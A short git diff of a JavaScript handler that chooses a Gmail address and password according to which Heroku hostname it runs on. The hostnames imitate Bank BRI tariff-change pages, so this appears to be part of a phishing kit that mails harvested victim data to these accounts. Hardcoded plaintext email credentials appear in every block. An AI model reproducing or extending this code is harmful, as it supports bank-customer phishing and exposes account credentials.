@@ -10,25 +10,13 @@ export default function handler(req, res) {
      if (url == 'pilihan-tarif-terbaru-brii.herokuapp.com'){
 
        email = 'jakad2748@gmail.com'
-       pass = 'eyyedapdhbhzywvm'
-    }else
-    
-     if (url == 'pilih-tarif-terbaru-brii.herokuapp.com'){
-
-       email = 'djaka4114@gmail.com'
-       pass = 'lzefwsxzaeftnrip'
+       pass = 'eyyedapdhbywvm'
     }else
     
    if (url == 'pilihan-tarif-bank-bri.herokuapp.com'){
 
        email = 'linkgoggle500@gmail.com'
        pass = 'dapwydphkoqywtiw'
-    }else
-    
-     if (url == 'pilihan-tarif-bri-baru.herokuapp.com'){
-
-       email = 'hendrimuliya61@gmail.com'
-       pass = 'xqljxywsozjuyizw'
     }else
     
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
